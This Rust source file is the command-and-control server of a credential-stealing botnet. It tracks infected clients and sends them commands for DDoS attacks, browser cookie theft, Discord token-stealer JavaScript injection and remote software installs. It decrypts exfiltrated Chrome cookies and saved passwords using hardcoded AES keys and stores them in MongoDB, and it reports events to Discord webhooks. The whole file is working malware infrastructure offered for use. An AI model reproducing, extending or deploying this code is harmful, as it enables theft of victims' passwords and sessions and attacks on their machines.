use chrono::Utc;
use core::time;
use futures_util::{SinkExt, StreamExt};
use mongodb::Client;
use once_cell::sync::Lazy;
use paris::{error, info, success};
use reqwest;
use serde_json::{json, Value};
use soft_aes::aes::aes_dec_ecb;
use std::collections::HashMap;
use std::error::Error;
use std::net::{SocketAddr, SocketAddrV4, ToSocketAddrs};
use std::str;
use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::signal;
use tokio::sync::broadcast::{self, Sender};
use tokio::sync::{Mutex, RwLock};
use tokio_tungstenite::{
    accept_async,
    tungstenite::{Error as tungerr, Result},
};
use url::Url;

use crate::dbtools::{add_or_update_cookie, add_or_update_logins};

mod clientstruct;
mod dbtools;
mod zombiestruct;
use clientstruct::ClientBase;

type ClientsMap = Arc<Mutex<HashMap<String, ClientBase>>>;
static MOMENT_WEBHOOK: Lazy<RwLock<String>> = Lazy::new(|| {
    RwLock::new("https://discord.com/api/webhook".to_string())
});

static GENERAL_WEBHOOK: Lazy<RwLock<String>> = Lazy::new(|| {
    RwLock::new("https://discord.com/api/webhook".to_string())
});

static MONGO_URL: Lazy<RwLock<String>> =
    Lazy::new(|| RwLock::new("mongodb://".to_string()));
static MONGO_DB_NAME: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new("logs".to_string()));
static MONGO_COOKIE_COLLECTION_NAME: Lazy<RwLock<String>> =
    Lazy::new(|| RwLock::new("cookies".to_string()));
static MONGO_LOGINS_COLLECTION_NAME: Lazy<RwLock<String>> =
    Lazy::new(|| RwLock::new("logins".to_string()));
static LOG_DC: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new("0".to_string()));

#[tokio::main]
async fn main() {
    clear_screen();

    let ip = "0.0.0.0";
    let main_port = "2001";
    let websocket_port = "2002";

    let address = format!("{}:{}", ip, main_port);
    let websocket_address = format!("{}:{}", ip, websocket_port);

    let clients: ClientsMap = Arc::new(Mutex::new(HashMap::new()));

    info!("Server starting on {address}");
    let listener = TcpListener::bind(&address)
        .await
        .expect("Failed to open port");

    info!("Websocket starting on {websocket_address}");
    let websocket_listener = TcpListener::bind(&websocket_address)
        .await
        .expect("Can't listen");

    success!("Server opened on {address}");
    success!("Websocket opened on {websocket_address}");

    post_info(format!("Server opened on **{}** ", address)).await;
    post_info(format!("Websocket opened on **{}** ", websocket_address)).await;

    let (sender, _) = broadcast::channel::<(String, String)>(100);
    let (sender_wbsocket, _) = broadcast::channel::<(String, String)>(100);

    tokio::spawn(handle_server_commands(sender.clone(), clients.clone()));

    let clientz = Arc::clone(&clients);
    let sender_clone = sender.clone();
    let sender_wbs_clone = sender.clone();
    let server = tokio::spawn(async move {
        while let Ok((socket, addr)) = listener.accept().await {
            match SystemTime::now().duration_since(UNIX_EPOCH) {
                Ok(timestamp) => {
                    clientz.lock().await.insert(
                        addr.to_string(),
                        ClientBase {
                            timestamp: timestamp.as_secs(),
                            choco_installed: "False".to_string(),
                            cookie_count: 0,
                            login_count: 0,
                        },
                    );
                }
                Err(err) => {}
            }

            let clients_clone = clientz.clone();
            let sender_clone = sender_clone.clone();
            let sender_websocket_clone = sender_wbs_clone.clone();
            tokio::spawn(async move {
                handle_connection(
                    socket,
                    addr,
                    sender_clone,
                    sender_websocket_clone,
                    clients_clone,
                )
                .await;
            });
        }
    });

    let clientz = Arc::clone(&clients);
    let sender_clone = sender.clone();
    let sender_wbs_clone = sender.clone();
    let websocket_server = tokio::spawn(async move {
        while let Ok((stream, _)) = websocket_listener.accept().await {
            let peer = stream
                .peer_addr()
                .expect("connected streams should have a peer address");
            info!("Peer address: {}", peer);
            let sender_clone = sender_clone.clone();
            let sender_websocket_clone = sender_wbs_clone.clone();
            let clients_clone = clientz.clone();

            tokio::spawn(accept_websocket_connection(
                peer,
                stream,
                clients_clone,
                sender_clone,
                sender_websocket_clone,
            ));
        }
    });

    info!("Server is running. Press Ctrl+C to stop.");

    tokio::select! {
        _ = signal::ctrl_c() => {
            info!("Server shutting down.");
            post_error(format!("Server shutting down **{}** ", address)).await;
        }
        _ = server => {
            info!("Server task completed.");
        }
        _ = websocket_server => {
            info!("Websocket server task completed.");
        }
    }
}

async fn post_info(msg: String) {
    let check = LOG_DC.read().await.to_string();
    if check == "1" {
        let now = Utc::now().timestamp();
        let content = format!("🔵 {} <t:{}:R>", msg, now);
        let client = reqwest::Client::new();
        let webhook = GENERAL_WEBHOOK.read().await;
        match client
            .post(webhook.to_string())
            .json(&json!({ "content": content }))
            .send()
            .await
        {
            Ok(_) => {}
            Err(_) => {
                error!("Log failed to discord !")
            }
        }
    }
}
async fn post_succes(msg: String) {
    let check = LOG_DC.read().await.to_string();
    if check == "1" {
        let now = Utc::now().timestamp();
        let content = format!("🟢 {} <t:{}:R>", msg, now);
        let client = reqwest::Client::new();
        let webhook = MOMENT_WEBHOOK.read().await;
        match client
            .post(webhook.to_string())
            .json(&json!({ "content": content }))
            .send()
            .await
        {
            Ok(_) => {}
            Err(_) => {
                error!("Log failed to discord !")
            }
        }
    }
}
async fn post_error(msg: String) {
    let check = LOG_DC.read().await.to_string();
    if check == "1" {
        let now = Utc::now().timestamp();
        let content = format!("🔴 {} <t:{}:R>", msg, now);
        let client = reqwest::Client::new();
        let webhook = MOMENT_WEBHOOK.read().await;
        match client
            .post(webhook.to_string())
            .json(&json!({ "content": content }))
            .send()
            .await
        {
            Ok(_) => {}
            Err(_) => {
                error!("Log failed to discord !")
            }
        }
    }
}
async fn handle_websocket_connection(
    peer: SocketAddr,
    stream: TcpStream,
    sender_tcp: Sender<(String, String)>,
    sender_websocket: Sender<(String, String)>,
    clients: ClientsMap,
) -> Result<()> {
    let mut receiver = sender_websocket.subscribe();
    match accept_async(stream).await {
        Ok(mut ws_stream) => loop {
            tokio::select! {
                msg = ws_stream.next() => {
                    match msg {
                        Some(Ok(msg)) => {
                            if msg.is_text() || msg.is_binary() {
                                match msg.clone().into_text() {
                                    Ok(message) => {
                                        println!("{}",message);
                                        match message.trim() {
                                            "?clients" => {
                                                match list_clients_json_string(&clients).await {
                                                    Ok(client_infos) => {
                                                        ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(client_infos)).await?;
                                                    },
                                                    Err(_) => {
                                                        ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(r#"{ "kind": "error" }"#.to_string())).await?;
                                                    },
                                                }

                                            },
                                            "?clients_count" => {
                                                ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(client_count_json(&clients).await)).await?;

                                            },
                                            "?getDefinedValues" => {
                                                match read_config_as_json_string().await {
                                                    Ok(values) => {
                                                        ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(values)).await?;
                                                    },
                                                    Err(error) => {
                                                        ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(r#"{ "kind": "error" }"#.to_string())).await?;
                                                    },
                                                }


                                            }
                                            _ => {
                                                match message.trim().split_whitespace().nth(1) {
                                                    Some(group) => {
                                                        let cloned = group.clone();
                                                        match message.trim().split_whitespace().nth(0) {
                                                            Some(command) => {
                                                                match command.trim() {
                                                                    "?ddos" => {
                                                                        send_broadcast(&sender_tcp, &format!("{} cookie", group))
                                                                    },
                                                                    "?cookies" => {
                                                                        send_broadcast(&sender_tcp, &format!("{} cookie", group))
                                                                    }
                                                                    "?changeValues" => {

                                                                        match update_config_from_json(cloned.to_string()).await {
                                                                            Ok(_) => {
                                                                                ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(r#"{ "kind": "succesfully" }"#.to_string())).await?
                                                                            },
                                                                            Err(x) => {
                                                                                ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(r#"{ "kind": "error" }"#.to_string())).await?
                                                                            },
                                                                        }
                                                                    },
                                                                    _ => {}
                                                                }
                                                            }
                                                            _ => {}
                                                        }
                                                    }
                                                    _ => {}
                                                }
                                            }
                                        }
                                    },
                                    Err(_) => {},
                                }

                            }
                        },
                        Some(Err(e)) => {
                            error!("Websocket error: {e}");
                        },
                        None => {
                            error!("{peer} seems to have disconnected from websocket.");
                            break;
                        },
                    }
                },
                Ok((target, message)) = receiver.recv() => {
                    if target == "client" {
                        match message.trim() {
                            "test"=> {

                            },
                            _=> {
                                match message.trim().split_whitespace().nth(0) {
                                    Some(trimmed_val) => {
                                        match trimmed_val.trim() {
                                            "new"=> {
                                                match message.trim().split_whitespace().nth(1) {
                                                    Some(trimmed_valz) => {
                                                        match message.trim().split_whitespace().nth(2) {
                                                            Some(trimmed_valv) => {
                                                                if trimmed_valv == "joined" {
                                                                    let clientz = &clients.lock().await;
                                                                    match clientz.get(trimmed_valz.trim()) {
                                                                        Some(x) => {
                                                                            let v = json!(
                                                                                {
                                                                                     "kind": trimmed_valv,
                                                                                     "ipport": trimmed_valz ,
                                                                                     "timestamp": x.timestamp,
                                                                                     "choco_installed": x.choco_installed,
                                                                                     "cookie_count": x.cookie_count,
                                                                                     "login_count": x.login_count
                                                                                }
                                                                            );
                                                                            if let Ok(jsn) = serde_json::to_string(&v) {
                                                                                ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(jsn)).await?;
                                                                            } else {
    
                                                                            }
                                                                        },
                                                                        None => {
                                                                            println!("Dont found");
                                                                        },
                                                                    }
                                                                } else if trimmed_valv == "leaved" {
                                                                    let v = json!(
                                                                        {
                                                                             "kind": trimmed_valv,
                                                                             "ipport": trimmed_valz ,
                                                                        }
                                                                    );
                                                                    if let Ok(jsn) = serde_json::to_string(&v) {
                                                                        ws_stream.send(tokio_tungstenite::tungstenite::Message::Text(jsn)).await?;
                                                                    } else {

                                                                    }
                                                                  
                                                                     
                                                                }
                                                            },
                                                            None => {

                                                            }
                                                        }
                                                    },
                                                    None => {

                                                    }
                                                }
                                            },
                                            _ => {

                                            }
                                        }
                                    },
                                    None => {},
                                }
                            }
                        }
                    }
                }

            }
        },
        Err(_) => {}
    }
    Ok(())
}

async fn accept_websocket_connection(
    peer: SocketAddr,
    stream: TcpStream,
    clients: ClientsMap,
    sender_tcp: Sender<(String, String)>,
    sender_websocket: Sender<(String, String)>,
) {
    if let Err(e) =
        handle_websocket_connection(peer, stream, sender_tcp, sender_websocket, clients).await
    {
        match e {
            tungerr::ConnectionClosed | tungerr::Protocol(_) | tungerr::Utf8 => (),
            _ => error!("Error processing connection"),
        }
    }
}

async fn handle_server_commands(sender: Sender<(String, String)>, clients: ClientsMap) {
    success!("Admin panel is ready! Type ?help for commands.");
    let stdin = tokio::io::stdin();
    let mut reader = BufReader::new(stdin);
    let mut input = String::new();

    while let Ok(_) = reader.read_line(&mut input).await {
        if input.trim() != "" || input.trim() != " " {
            match input.trim() {
                "?help" => display_help(),
                "?clear" => clear_screen(),
                "?countclients" => {
                    let _ = client_count(&clients).await;
                }
                "?listclients" => list_clients(&clients).await,
                _ => {
                    match input.split_whitespace().nth(1) {
                        Some(group) => {
                            match input.trim().split_whitespace().nth(0) {
                                Some(command) => {
                                    match command {
                                        "?ddos" => {
                                            send_broadcast(&sender, &format!("{} ddos", group))
                                        }
                                        "?cookies" => {
                                            send_broadcast(&sender, &format!("{} cookie", group))
                                        }
                                        "?proxy" => {
                                            match input.trim().split_whitespace().nth(2) {
                                                Some(webhook) => match Url::parse(webhook) {
                                                    Ok(parsed_webhook) => {
                                                        match  parsed_webhook.host_str() {
                                                                Some(main_host) => {
                                                                    match main_host {
                                                                        "discord.com" => {
                                                                            send_broadcast(&sender, format!("{} proxy {}",group,webhook).as_str());
                                                                        },
                                                                        _ => error!("Only support discord webhooks.")
                                                                    }
                                                                },
                                                                None => error!("Wrong url"),
                                                            }
                                                    }
                                                    Err(_) => error!("Wrong url"),
                                                },
                                                None => error!(
                                                    "Usage: ?proxy https://discord.com/webhook"
                                                ),
                                            }
                                        }
                                        "?discordinj" => {
                                            match input.trim().split_whitespace().nth(2) {
                                                Some(webhook) => {
                                                    match Url::parse(webhook) {
                                                        Ok(parsed_webhook) => {
                                                            match  parsed_webhook.host_str() {
                                                                Some(main_host) => {
                                                                    match main_host {
                                                                        "discord.com" => {
                                                                            match input.trim().split_whitespace().nth(2) {
                                                                                Some(injcodelink) => {
                                                                                    send_broadcast(&sender, format!("{} kkdc {} {}",group,webhook,injcodelink).as_str());
                                                                                },
                                                                                None => error!("Usage: ?discordinj https://discord.com/webhook https://pastebin.com/abcinjection"),
                                                                            }
                                                                        },
                                                                        _ => error!("Only support discord webhooks.")
                                                                    }
                                                                },
                                                                None => error!("Wrong url"),
                                                            }
                                                        },
                                                        Err(_) => error!("Wrong url"),
                                                    }
                                                },
                                                None => error!("Usage: ?discordinj https://discord.com/webhook https://pastebin.com/abcinjection"),
                                            }
                                        }
                                        "?chocodown" => {
                                            send_broadcast(&sender, &format!("{} chc", group))
                                        }
                                        _ => unknown_command(),
                                    }
                                }
                                None => unknown_command(),
                            }
                        }
                        None => error!("Select group [all or ip:port]"),
                    }
                }
            }
        }
        input.clear();
    }
}

async fn handle_connection(
    mut socket: TcpStream,
    addr: SocketAddr,
    sender: Sender<(String, String)>,
    sender_websocket: Sender<(String, String)>,
    clients: ClientsMap,
) {
    info!("{addr} connected to the server!");
    post_succes(format!("**{}** connected to the server!", addr)).await;
    let formt = format!("new {} {}", addr.to_string(), "joined");
    if let Ok(status) = sender_websocket.send(("client".to_string(), formt)) {}
    let mut receiver = sender.subscribe();
    let (mut reader, mut writer) = socket.split();

    let mut buffer = [0; 10240];
    let mut data_vec: Vec<u8> = Vec::new();

    loop {
        tokio::select! {
            result = reader.read(&mut buffer) => {
                match result {
                    Ok(0) => {
                        let snder_wbh =  sender_websocket.clone();
                        handle_disconnection(&addr, &clients,snder_wbh).await;
                        break;
                    },
                    Ok(n) => {
                        let buffer_slice = &buffer[..n];
                        if process_buffer(buffer_slice, &mut data_vec,addr).await.is_err() {
                            error!("Failed to process buffer data for {addr}");
                        }
                    },
                    Err(_) => {
                        let snder_wbh =  sender_websocket.clone();
                        handle_disconnection(&addr, &clients,snder_wbh).await;
                        break;
                    }
                }
            },
            Ok((target, message)) = receiver.recv() => {
                if target == "client" {
                    let mut parts = message.split_whitespace();
                    let group = parts.next();
                    let rest_of_message = parts.collect::<Vec<&str>>().join(" ");

                    match group {
                        Some("all") => {
                            if writer.write_all(rest_of_message.as_bytes()).await.is_err() {
                                error!("{addr} seems to have disconnected unexpectedly.");
                                break;
                            }
                        },
                        Some(group) => {
                            if addr.to_string() == group {
                                if writer.write_all(rest_of_message.as_bytes()).await.is_err() {
                                    error!("{addr} seems to have disconnected unexpectedly.");
                                    break;
                                }
                            }
                        },
                        None => error!("Select group [all or ip:port]"),
                    }
                }
            },
        }
    }
}

async fn handle_disconnection(
    addr: &SocketAddr,
    clients: &ClientsMap,
    sender: Sender<(String, String)>,
) {
    error!("{addr} seems to have disconnected.");
    post_error(format!("**{}** seems to have disconnected.", addr)).await;

    let formt = format!("new {} {}", addr.to_string(), "leaved");
    if let Ok(status) = sender.send(("client".to_string(), formt)) {}
    let a = addr.to_string();
    clients.lock().await.remove(&a);
}
async fn process_buffer(
    buffer: &[u8],
    data_vec: &mut Vec<u8>,
    addr: SocketAddr,
) -> Result<(), Box<dyn Error>> {
    let ts = String::from_utf8_lossy(&buffer).to_string();
    let search_term = b"finished";

    let chc_term = "CHCHHHHCHCH11233444";

    if buffer == search_term {
        if let Ok(decoded_data) = decode_and_decrypt(data_vec) {
            //println!("{:#?}",&decoded_data);

            let parsed: zombiestruct::Root =
                serde_json::from_str(&decoded_data).expect("Failed to parse JSON");

            let url = MONGO_URL.read().await;
            let client = Client::with_uri_str(url.to_string()).await?;
            let mongo_db_name = MONGO_DB_NAME.read().await;
            let database = client.database(&mongo_db_name);

            let mongo_cookie_collection_name = MONGO_COOKIE_COLLECTION_NAME.read().await;
            let mongo_login_collection_name = MONGO_LOGINS_COLLECTION_NAME.read().await;
            let cookie_coll: mongodb::Collection<dbtools::Cookiecollection> =
                database.collection::<dbtools::Cookiecollection>(&mongo_cookie_collection_name);
            let login_coll: mongodb::Collection<dbtools::Logincollection> =
                database.collection::<dbtools::Logincollection>(&mongo_login_collection_name);

            let final_cookie =
                dbtools::cookie_to_mongo(parsed.clone().value.chrome_cookies, "test".to_owned());
            let final_login =
                dbtools::login_to_mongo(parsed.clone().value.passwords, "test".to_owned());

            add_or_update_cookie(&cookie_coll, final_cookie).await?;
            add_or_update_logins(&login_coll, final_login).await?;

            println!("{:#?}", parsed);
        }
        data_vec.clear();
    } else {
        match ts.split_whitespace().nth(1) {
            Some(message) => {
                if ts.contains(chc_term) {
                    info!("{addr}: {message}");
                }
            }
            None => {
                data_vec.extend_from_slice(buffer);
            }
        }
    }

    Ok(())
}

fn decode_and_decrypt(data: &[u8]) -> Result<String, &'static str> {
    let encoded_str = str::from_utf8(data).map_err(|_| "Invalid UTF-8 sequence")?;

    #[allow(deprecated)]
    let decoded_first = base64::decode(encoded_str).map_err(|_| "Failed to decode Base64")?;
    let decrypted_first = aes_dec_ecb(&decoded_first, b"7ft^P8R6*PN5^KkA", Some("0x80"))
        .map_err(|_| "Failed to decrypt first stage data")?;

    let decrypted_str =
        str::from_utf8(&decrypted_first).map_err(|_| "Invalid UTF-8 sequence after decryption")?;
    let parsed_json: Value =
        serde_json::from_str(decrypted_str).map_err(|_| "Failed to parse JSON")?;

    if parsed_json["key"] == "%oZcMFu3e$NBamSF%3fKnW9t@27sp2Q6" {
        let crypted_values = serde_json::to_string(&parsed_json["value"])
            .map_err(|_| "Failed to serialize JSON values")?;
        let cleaned_values = crypted_values.replace(r#"""#, "");
        #[allow(deprecated)]
        let cleared_data =
            base64::decode(cleaned_values).map_err(|_| "Failed to decode Base64 in main values")?;
        let main_json = aes_dec_ecb(
            &cleared_data,
            b"DT!rBz4!Z8z3NDdDJ^gCyNm7LrWxsX^J",
            Some("0x80"),
        )
        .map_err(|_| "Failed to decrypt main JSON")?;
        let real_data =
            str::from_utf8(&main_json).map_err(|_| "Invalid UTF-8 sequence in main JSON")?;

        return Ok(real_data.to_string());
    }

    Err("Key mismatch")
}

async fn update_config_from_json(json_data: String) -> Result<(), serde_json::Error> {
    let config: dbtools::Config = serde_json::from_str(json_data.clone().as_str())?;

    let mut moment_webhook = MOMENT_WEBHOOK.write().await;
    let mut general_webhook = GENERAL_WEBHOOK.write().await;
    let mut mongo_url = MONGO_URL.write().await;
    let mut mongo_db_name = MONGO_DB_NAME.write().await;
    let mut mongo_cookie_collection_name = MONGO_COOKIE_COLLECTION_NAME.write().await;
    let mut mongo_logins_collection_name = MONGO_LOGINS_COLLECTION_NAME.write().await;
    let mut log_dc = LOG_DC.write().await;

    *moment_webhook = config.moment_webhook;
    *general_webhook = config.general_webhook;
    *mongo_url = config.mongo_url;
    *mongo_db_name = config.mongo_db_name;
    *mongo_cookie_collection_name = config.mongo_cookie_collection_name;
    *mongo_logins_collection_name = config.mongo_logins_collection_name;
    *log_dc = config.log_dc;
    Ok(())
}
async fn read_config_as_json_string() -> Result<String, serde_json::Error> {
    let config = dbtools::Config {
        moment_webhook: MOMENT_WEBHOOK.read().await.clone(),
        general_webhook: GENERAL_WEBHOOK.read().await.clone(),
        mongo_url: MONGO_URL.read().await.clone(),
        mongo_db_name: MONGO_DB_NAME.read().await.clone(),
        mongo_cookie_collection_name: MONGO_COOKIE_COLLECTION_NAME.read().await.clone(),
        mongo_logins_collection_name: MONGO_LOGINS_COLLECTION_NAME.read().await.clone(),
        log_dc: LOG_DC.read().await.clone(),
    };
    let finalize = json!(
        {
            "kind": "get",
            "value": config,
        }
    );
    let json_string = serde_json::to_string(&finalize)?;
    Ok(json_string)
}

fn clear_screen() {
    if clearscreen::clear().is_err() {
        error!("Failed to clear screen");
    }
}

fn display_help() {
    info!("Available commands:");
    info!("?help - Show this help message.");
    info!("?ddos - Send a message to all clients.");
    info!("?clear - Clear the terminal screen.");
    info!("?listclients - List all connected clients and their connection durations.");
    info!("?countclients - Count all connected clients.");
    info!("?cookies - Request all clients to provide their cookies.");
    info!("?proxy [discord_webhook_url] - Set up a proxy using the specified Discord webhook URL.");
    info!("?discordinj [discord_webhook_url] [injection_url] - Deploy Discord stealer JS to all clients (supports URLs from Pastebin or similar).");
    info!("?chocodown - Install Chocolatey package manager on all clients.");
}

fn send_broadcast(sender: &Sender<(String, String)>, message: &str) {
    if sender
        .send(("client".to_string(), message.to_string()))
        .is_err()
    {
        error!("Failed to broadcast message");
    }
}

async fn client_count(clients: &ClientsMap) -> String {
    let clients_guard: tokio::sync::MutexGuard<HashMap<String, ClientBase>> =
        clients.lock().await;
    let mut count = String::new();
    if clients_guard.is_empty() {
        info!("No clients connected.");
    } else {
        let countz = clients_guard.len();
        count = countz.to_string();
        info!("{countz} clients connected");
    }
    count.to_string()
}
async fn client_count_json(clients: &ClientsMap) -> String {
    let clients_guard = clients.lock().await;
    let count = clients_guard.len();

    let json_response = if count == 0 {
        json!({ "kind": "client_count", "count": "0"})
    } else {
        json!({ "kind": "client_count","client_count": count})
    };

    json_response.to_string()
}

async fn list_clients(clients: &ClientsMap) {
    let clients_guard = clients.lock().await;
    if clients_guard.is_empty() {
        info!("No clients connected.");
    } else {
        for (addr, base) in clients_guard.iter() {
            match SystemTime::now().duration_since(UNIX_EPOCH) {
                Ok(timestamp) => {
                    let duration = timestamp.as_secs() - base.timestamp;
                    info!("{addr} connected for {duration} seconds");
                }
                Err(err) => {}
            }
        }
    }
}
async fn list_clients_json_string(clients: &ClientsMap) -> Result<String, serde_json::Error> {
    let clients_guard = clients.lock().await;
    if clients_guard.is_empty() {
        let empty_json = json!({ "kind": "list_clients","clients": []});
        let empty_tostring = serde_json::to_string(&empty_json)?;
        return Ok(empty_tostring);
    } else {
        let client_list: Vec<_> = clients_guard
            .iter()
            .map(|(addr, base)| {
                json!({
                    "addr": addr,
                    "timestamp": base.timestamp,
                    "choco_installed": base.choco_installed,
                    "cookie_count": base.cookie_count,
                    "login_count": base.login_count,
                })
            })
            .collect();
        let finalize = json!({ "kind": "list_clients", "clients": client_list });
        let tostringized = serde_json::to_string(&finalize)?;
        return Ok(tostringized);
    }
}

fn unknown_command() {
    error!("Unknown command. Type ?help for a list of commands.");
}
